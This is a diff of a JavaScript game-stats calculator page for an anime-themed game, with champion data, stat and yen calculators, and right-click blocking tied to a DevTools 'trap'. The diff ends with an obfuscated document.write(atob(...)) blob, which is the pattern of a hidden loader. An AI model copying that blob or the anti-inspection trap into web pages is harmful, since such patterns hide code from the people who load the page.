+                { name: "Jotaro", chance: "3.84%", cost: "7500 Shards", board: 1, desc: "Auto trains 45% of your Durability multiplier every $ seconds. Specially buffs stand damage by 20% and nerfs incomming stand damage by 25%" },
+                { name: "Jiraiya", chance: "3.41%", cost: "7500 Shards", board: 1, desc: "Auto trains 50% of your Chakra multiplier every 4 seconds. Nerfs chakra damage by 25%" },
+                { name: "Naruto", chance: "3.2%", cost: "7500 Shards", board: 1, desc: "Auto trains 55% of your Chakra multiplier every 4 seconds. Nerfs all Chakra damage by 30% and buffs Chakra damage by 20%" },
+                { name: "Vegeta", chance: "2.76%", cost: "7500 Shards", board: 1, desc: "Auto trains 50% of your Strength multiplier every 4 seconds. Nerfs all Strength damage by 30% and all damage is buffed by 1.6x when health is below 30%" },
+                { name: "Genos", chance: "0.681%", cost: "7500 Shards", board: 1, desc: "When the player reaches 20% if his health, all damages are reduced to 30% of their original value. Auto trains 95% of your chakra. Nerfs all player damage by 30% and buffs all damage by 15%" },
+                { name: "Boros", chance: "0.68%", cost: "7500 Shards", board: 1, desc: "Auto trains 305 of your Chakra, 50% strength and Durability multiplier ever 4 seconds. Nerfs all damage by 30% and buffs all damage by 20%" },
+                { name: "Ichigo", chance: "0.56%", cost: "7500 Shards", board: 1, desc: "Auto trains 30% if your strength, 75% of Sword and 50% of Durability multiplier every 4 seconds. Nerfs all player damage by 10% and buffs all damage by 40%" },
+                { name: "Rengoku", chance: "0.42%", cost: "7500 Shards", board: 1, desc: "Auto trains 305 of your chakra, 70% of your Sword multiplier every 4 seconds. Nerfs all Chakra damage by 40% and buffs Chakra damage by 30%" },
+                { name: "Sasuke", chance: "0.31%", cost: "7500 Shards", board: 1, desc: "Every player kill multiplies damage by 80% for 20 seconds. Trains 80% of Chakra, nerds all damage by 25% and buffs all damage by 50%" },
+                { name: "Itachi", chance: "0.19%", cost: "7500 Shards", board: 1, desc: "When the player reaches 105 of his health, he will become immune to all attacks for 8 seconds. Train 80% of Chakra, 20% of Strength and 20% of Durability. He also nerfs all damage by 25% and buffs all damage by 50%" },
+                { name: "Gojo", chance: "0.0031%", cost: "7500 Shards", board: 1, desc: "Auto trains 125% Durability. Nerfs all player damge by 50% buffs all damge by 25% and increases your Chikara Per Min by x1.5" },
+                { name: "Light Yagami", chance: "0.003%", cost: "7500 Shards", board: 1, desc: "Auto trains 100% of your Chakra. Nerfs all player damge by 50% buffs all damge by 50% and increases your Chikara Per Min by x1.5" },
+                { name: "Saitama Serious", chance: "0.005%", cost: "7500 Shards", board: 1, desc: "Auto trains 150% of your Strength, 150% of your Durability. Nerfs all player damge by 50% buffs all damge by 100% increase your Chikara Per Min by x1.5, increases your Yen per Min by x1.25" },
+                { name: "Giovanna", chance: "40.37%", cost: "500 Shards", board: 2, desc: "Trains 60% Strength & 50% Durability every 4s. Buffs all Stand damage by 20%." },
+                { name: "Buu", chance: "29.84%", cost: "500 Shards", board: 2, desc: "Trains 70% Strength and 70% Chakra. Buffs all damage by 20%. Nerfs all damage by 10%" },
+                { name: "Gon", chance: "20.11%", cost: "500 Shards", board: 2, desc: "Train 50% Strength 50% Durability and 50% Chakra. He nerfs all incoming damage by 35%." },
+                { name: "Shinra", chance: "4.17%", cost: "1250 Shards", board: 2, desc: "Shunro trains 70% of Speed 45% if Durability and 55% of Chakra finally he also doubles all chakra damage" },
+                { name: "Krillin", chance: "3.12%", cost: "1500 Shards", board: 2, desc: "Trains 95% Strength and 85% Durability. Buffs all damage by 30%. Nerfs all Quarks by an additional 50%" },
+                { name: "Escanor", chance: "1.83%", cost: "2250 Shards", board: 2, desc: "Trains 60% Sword 50% Durability and 45% Strength he doubles all your damage and nerf all incomimg damage by 50% when it's day time" },
+                { name: "Meliodas", chance: "0.44%", cost: "3200 Shards", board: 2, desc: "A strength oriented Champion by training 90% of Strenght and 80% of Durability Overall he nerfs all damage by 50% and buffs al outgoing damage by 35%" },
+                { name: "Goku", chance: "0.43%", cost: "7500 Shards", board: 2, desc: "After every player kill your damage doubles for 10 seconds. Auto trains 95% if your Chakra. Nerfs all player damage by 50% and buffs all damage by 25%." },
+                { name: "Saitama", chance: "0.12%", cost: "7500 Shards", board: 2, desc: "Auto trains 110% of your Strength 110% of your Durability. Nerfs all damage by 50% buffs all Damage by 50% increases your Yen Per Min by x1.1" },
+                { name: "Chopper", chance: "Chopper Quest", cost: "Event Only", board: 3, desc: "Auto trains 100% of your Durability 100% of your Sword. Nerfs all damage by 30%. buffs all Damage by 30% and increase your Chikara Per Min by x1.05" },
+                { name: "Ace", chance: "Chopper Quest", cost: "Event Only", board: 3, desc: "Auto trains 100% of your strength 100% of your Chakra. Nerfs all damage by 30% buffs all Damage by 30% increases your Yen Per Min by x1.05 and prevents you from being stunned" },
+                { name: "Kirito", chance: "Kirito Quest", cost: "Event Only", board: 3, desc: "Auto train 125% sword. Nerfs all player damage by 50% buffs all Damage by 25% increases your Yen Per Min by x1.05" },
+                { name: "Pain", chance: "0.005%", cost: "Event Only", board: 3, desc: "Auto trains 150% of your Strength 140% of your Durabiltity and 40% Sword. Nerfs all player damage y 50% buffs all Damage by 25% and increases your Chikara per min by x1.75" },
+                { name: "Rimuru", chance: "0.005%", cost: "Event Only", board: 3, desc: "Auto trains 200% of your Chakra. Nerfs all player damage by 50% buffs all damage by 50% and increases your Chikara Per Min by x2" },
+                { name: "Shanks", chance: "Battle Pass Tier 45", cost: "Event Only", board: 3, desc: "Auto trains 125% of your Durability, Nerfs all Damage by 35%, increases your Yen Per Min by x1.1" },
+                { name: "Six Path Sage Mode Naruto", chance: "Battle Pass Tier 45", cost: "Event Only", board: 3, desc: "Auto trains 175% of your Durability, Nerfs all player damage by 25%, buffs all Bloodline damage by 55%, increases your Yen Per Min by x1.15" },
+                { name: "Kakashi", chance: "Battle Pass Tier 25", cost: "Event Only", board: 3, desc: "Auto trains 160% of your Strength, Nerfs all player damage by 20%, buffs all Damage by 25%, increases your Yen Per Min by x1.1" },
+                { name: "Rock Lee", chance: "Battle Pass Tier 1", cost: "Event Only", board: 3, desc: "Auto trains 110% of your Strength, 120% of your Durability, 125% of your Agility, Nerfs all player damage by 25%, buffs all damage by 25%, increases your Yen Per Min by x1.05" },
+                { name: "Minato", chance: "0.01% or Minato 10th Quest", cost: "Event Only", board: 3, desc: "Auto trains 175% of your Chakra, Buffs Kurama damage by 1.5x and Kurama drop chances by 1.5x increases your Yen Per Min by x1.05." },
+            ];  
+            
+            let lastStatPerMinute = 0;
+            let boostActive = false;
+            let boostSecondsRemaining = 0;
+            let boostInterval = null;
+            let currentFilter = 'all';
+            let searchTerm = '';
+            
+            // Parse number function (supports K, M, B, etc.)
+            function parseNum(val) {
+                if (!val) return 0;
+                val = val.toString().toUpperCase().replace(/,/g, '');
+                const map = { K: 1e3, M: 1e6, B: 1e9, T: 1e12, QD: 1e15, QN: 1e18, SX: 1e21, SP: 1e24, Oc: 1e27, N: 1e30, DE: 1e33, UD: 1e36, DD: 1e39 };
+                const match = val.match(/([0-9.]+)([A-Z]+)/);
+                if (match && map[match[2]]) return parseFloat(match[1]) * map[match[2]];
+                return parseFloat(val) || 0;
+            }
+            
+            // Format number function
+            function formatNum(num) {
+                if (num === 0) return "0";
+                const map = [
+                    { v: 1e39, s: "DD" }, { v: 1e36, s: "UD" }, { v: 1e33, s: "DE" }, { v: 1e30, s: "N" }, { v: 1e27, s: "Oc" }, 
+                    { v: 1e24, s: "SP" }, { v: 1e21, s: "SX" }, { v: 1e18, s: "QN" }, { v: 1e15, s: "QD" }, { v: 1e12, s: "T" }, 
+                    { v: 1e9, s: "B" }, { v: 1e6, s: "M" }, { v: 1e3, s: "K" }
+                ];
+                for (let i = 0; i < map.length; i++) {
+                    if (num >= map[i].v) return (num / map[i].v).toFixed(2).replace(/\.00$/, '') + map[i].s;
+                }
+                return num.toFixed(2).replace(/\.00$/, '');
+            }
+            
+            // Toggle mode function
+            function toggleStatsMode(mode) {
+                const afk = s("afkSwitch");
+                const click = s("clickingSwitch");
+                
+                if (mode === 'AFK' && afk.checked) {
+                    click.checked = false;
+                } else if (mode === 'CLICK' && click.checked) {
+                    afk.checked = false;
+                }
+                calculateStats();
+            }
+            
+            // Start Boost function
+            window.startBoost = function() {
+                const mins = parseInt(s("boostMinutes").value) || 0;
+                boostActive = true;
+                boostSecondsRemaining = mins * 60;
+                s("countdownDisplay").style.display = "block";
+                
+                if (isNaN(mins) || mins <= 0) {
+                    s("boostMinutes").classList.add("invalid");
+                    s("boostError").classList.add("earthquake-shake");
+                    setTimeout(() => s("boostError").classList.remove("earthquake-shake"), 500);
+                    throw new Error("Invalid Value!");
+                } else {
+                    s("boostMinutes").classList.remove("invalid");
+                }
+
+                if (boostInterval) clearInterval(boostInterval);
+                boostInterval = setInterval(() => {
+                    boostSecondsRemaining--;
+                    if (boostSecondsRemaining <= 0) {
+                        clearInterval(boostInterval);
+                        boostActive = false;
+                        s("countdownDisplay").style.display = "none";
+                        calculateStats();
+                    } else {
+                        s("timerText").innerText = `${Math.floor(boostSecondsRemaining / 60).toString().padStart(2, '0')}:${(boostSecondsRemaining % 60).toString().padStart(2, '0')}`;
+                        calculateStats();
+                    }
+                }, 1000);
+            };
+            
+            // Main calculateStats function
+            window.calculateStats = function() {
+                const statName = s("statOption").value;
+                const perTick = parseNum(s("statPerTick").value) * (boostActive ? 1.5 : 1);
+                const tickRate = s("clickingSwitch").checked ? ticksPerStat[statName].Clicking : ticksPerStat[statName].AFK;
+                lastStatPerMinute = (perTick * tickRate) + (parseNum(s("championTickStat").value) * 15);
+                const want = parseNum(s("wantedStats").value);
+                const cur = parseNum(s("currentStats").value);
+                const mins = (want - cur) / lastStatPerMinute;
+
+                s("statGainPerMinute").innerHTML = `Per Minute: ${formatNum(lastStatPerMinute)} ${boostActive ? '<span style="color:#00ffcc">(x1.5)</span>' : ''}`;
+                if (want > cur) {
+                    const days = Math.floor(mins / 1440);
+                    const hours = Math.floor((mins % 1440) / 60);
+                    const minutes = Math.floor(mins % 60);
+                    s("timeToReach").textContent = `Time: ${days}d ${hours}h ${minutes}m`;
+                } else {
+                    s("timeToReach").textContent = `Target already reached!`;
+                }
+            };
+            
+            // Yen Calculator function
+            window.calculateCoins = function() {
+                const isX2 = s("x2").checked;
+                const baseVal = parseNum(s("rank").value) * (isX2 ? 2 : 1);
+                const total = baseVal * parseFloat(s("nenMulti").value) * parseFloat(s("heroMulti").value) * parseNum(s("championYenMulti").value);
+                s("baseYenDisplay").innerText = `Base Yen / Min: ${formatNum(baseVal)}`;
+                s("yenPerMin").textContent = "Yen / Min: " + formatNum(total);
+                const mins = Math.max(0, (parseNum(s("neededCoins").value) - parseNum(s("currentCoins").value)) / total);
+                s("coinsResult").textContent = `Time: ${Math.floor(mins / 1440)}d ${Math.floor((mins % 1440) / 60)}h ${Math.floor(mins % 60)}m`;
+            };
+            
+            // Set up toggle event listeners
+            if (s("afkSwitch")) {
+                s("afkSwitch").onchange = () => toggleStatsMode('AFK');
+                s("clickingSwitch").onchange = () => toggleStatsMode('CLICK');
+            }
+            
+            // Initialize Ranks Page
+            function initRanks() {
+                const sel = s("statRankSelect");
+                if (!sel) return;
+                
+                sel.innerHTML = Object.keys(rankData).map(r => `<option value="${r}">${r}</option>`).join('');
+                sel.onchange = () => {
+                    const d = rankData[sel.value];
+                    let html = `<div class="req-item" style="border-left-color: #ffd700; background:rgba(255, 215, 0, 0.05);">Yen Cost <div class="req-val" style="font-size: 24px; color: #ffd700; font-weight: 900;">${d.cost} <button class="transfer-btn" onclick="transferYen('${d.cost}')">USE</button></div></div>`;
+                    if (d.Strength !== "0") html += `<div class="req-item" style="flex-direction:row; justify-content:space-between; align-items:center;">Strength <div class="req-val" style="width:auto; margin-top:0; border:none; padding:0; color:white; font-size:24px; font-weight:900;">${d.Strength}</div></div>`;
+                    if (d.Durability !== "0") html += `<div class="req-item" style="flex-direction:row; justify-content:space-between; align-items:center;">Durability <div class="req-val" style="width:auto; margin-top:0; border:none; padding:0; color:white; font-size:24px; font-weight:900;">${d.Durability}</div></div>`;
+                    if (d.Chakra !== "0") html += `<div class="req-item" style="flex-direction:row; justify-content:space-between; align-items:center;">Chakra <div class="req-val" style="width:auto; margin-top:0; border:none; padding:0; color:white; font-size:24px; font-weight:900;">${d.Chakra}</div></div>`;
+                    if (d.Sword !== "0") html += `<div class="req-item" style="flex-direction:row; justify-content:space-between; align-items:center;">Sword <div class="req-val" style="width:auto; margin-top:0; border:none; padding:0; color:white; font-size:24px; font-weight:900;">${d.Sword}</div></div>`;
+                    s("statRequirementsDisplay").innerHTML = html;
+                };
+                if (sel.options.length > 0) {
+                    sel.dispatchEvent(new Event('change'));
+                }
+            }
+            
+            // Transfer Yen function
+            window.transferYen = function(cost) {
+                if (s("neededCoins")) {
+                    s("neededCoins").value = cost;
+                    showTab('statsPage', null);
+                    calculateCoins();
+                }
+            };
+            
+            // Initialize Powers Page
+            window.updatePowersDisplay = function() {
+                const stat = s("powersSelect").value;
+                const display = s("powersDisplay");
+                if (!display) return;
+                
+                if (powerData[stat]) {
+                    display.innerHTML = powerData[stat].map(p => `
+                        <div class="req-item">
+                            <span>${p.name}</span>
+                            <div class="req-val">${p.val}</div>
+                        </div>
+                    `).join('');
+                }
+            };
+            
+            // Initialize Champions Page
+            function initChamps() {
+                renderChampions();
+            }
+            
+            // Render Champions with filtering
+            function renderChampions() {
+                const display = s("championsDisplay");
+                if (!display) return;
+                
+                let filteredChampions = championsData;
+                
+                // Apply search filter
+                if (searchTerm) {
+                    filteredChampions = filteredChampions.filter(champ => 
+                        champ.name.toLowerCase().includes(searchTerm.toLowerCase())
+                    );
+                }
+                
+                // Apply board filter
+                if (currentFilter !== 'all') {
+                    filteredChampions = filteredChampions.filter(champ => 
+                        currentFilter === 3 ? champ.board === 3 : champ.board === currentFilter
+                    );
+                }
+                
+                if (filteredChampions.length === 0) {
+                    display.innerHTML = '<div style="text-align: center; color: #aaa; padding: 20px;">No champions found matching your search.</div>';
+                    return;
+                }
+                
+                display.innerHTML = filteredChampions.map(c => `
+                    <div class="champion-box">
+                        <span class="champion-name-header">${c.name}</span>
+                        <div class="champ-meta">
+                            <span class="badge badge-chance">Chance: ${c.chance}</span>
+                            <span class="badge badge-board">${c.board === 3 ? 'Limited' : 'Board ' + c.board}</span>
+                            <span style="color: #00ffcc; font-size: 12px;">Cost: ${c.cost}</span>
+                        </div>
+                        <div class="champ-desc-box">${c.desc}</div>
+                    </div>
+                `).join('');
+            }
+            
+            // Filter Champions by search
+            window.filterChampions = function() {
+                searchTerm = s("championSearch").value;
+                renderChampions();
+            };
+            
+            // Filter by Board
+            window.filterByBoard = function(board) {
+                currentFilter = board;
+                renderChampions();
+            };
+            
+            // Clear filters
+            window.clearFilters = function() {
+                currentFilter = 'all';
+                searchTerm = '';
+                s("championSearch").value = '';
+                renderChampions();
+            };
+            
+            // Block right click (but don't trigger trap)
+            d.addEventListener('contextmenu', function(e) {
+                e.preventDefault();
+                // Just prevent context menu, don't trigger trap
+            });
+            
             // Fire Effect
             const _v = s('fireCanvas'), _x = _v.getContext('2d');
             let _p = [];
@@ -373,22 +1857,95 @@
             window.onresize = _r; _r();
             class _f {
                 constructor() {
-                    this.x = Math.random() * _v.width; this.y = _v.height + 50; this.sY = 2 * Math.random() + 1; this.sz = 15 * Math.random() + 5; this.l = 1;
+                    this.x = Math.random() * _v.width; 
+                    this.y = _v.height + 50; 
+                    this.sY = 2 * Math.random() + 1; 
+                    this.sz = 15 * Math.random() + 5; 
+                    this.l = 1;
                 }
                 u() { this.y -= this.sY; this.l -= 0.01; }
                 dr() {
                     _x.fillStyle = `rgba(255, ${Math.floor(Math.random() * 100)}, 0, ${this.l})`;
-                    _x.beginPath(); _x.arc(this.x, this.y, this.sz, 0, Math.PI * 2); _x.fill();
+                    _x.beginPath(); 
+                    _x.arc(this.x, this.y, this.sz, 0, Math.PI * 2); 
+                    _x.fill();
                 }
             }
+            
             function _an() {
+                if (trapActivated) return;
                 _x.clearRect(0, 0, _v.width, _v.height);
                 if (_p.length < 100) _p.push(new _f);
                 _p.forEach((p, i) => { p.u(); p.dr(); if (p.l <= 0) _p.splice(i, 1); });
                 requestAnimationFrame(_an);
             }
             _an();
+            
+            // Initialize everything when page loads
+            window.onload = function() {
+                // Initialize calculator functions
+                if (s("rank")) calculateCoins();
+                if (s("statOption")) calculateStats();
+                
+                // Set up toggle event listeners for stats calculator
+                const afk = s("afkSwitch");
+                const click = s("clickingSwitch");
+                if (afk && click) {
+                    afk.onclick = () => { click.checked = !afk.checked; calculateStats(); };
+                    click.onclick = () => { afk.checked = !click.checked; calculateStats(); };
+                }
+                
+                // Log initialization
+                console.log("🔐 KEYBOARD SHORTCUT PROTECTION LOADED");
+                console.log("⚠️ Only specific DevTools keyboard shortcuts will trigger the trap");
+                console.log("ℹ️ Right-click and mouse actions are allowed");
+
+
+                
+                
+            };
         })();
     </script>
+
+    <script>
+        document.write(decodeURIComponent(escape(atob("a3c1f8b7e6d4c2a9f5b1d8e3c7a2f6b4d9e1c5a8f3b6d2e9c4a7f1b5d8e2c6a9f4b1d7e3c8a2f6b5d1e9c4a7f2b6d8e3c1a9f5b4d2e7c6a1f8b3d9e5c2a7f4b1d6e8c3a9f2b5d1e7c4a8f6b3d9e2c5a1f8b4d7e6c2a9f3b5d1e8c4a7f2b6d9e5c1a3f8b4d2e7c6a9f1b5d3e8c2a7f4b6d1e9c5a2f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c5a2f8b3d7e4b6a1f9c5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f1b5d2e8c3a7f6b4d1e9c2a5f8b3d7e6c4a9f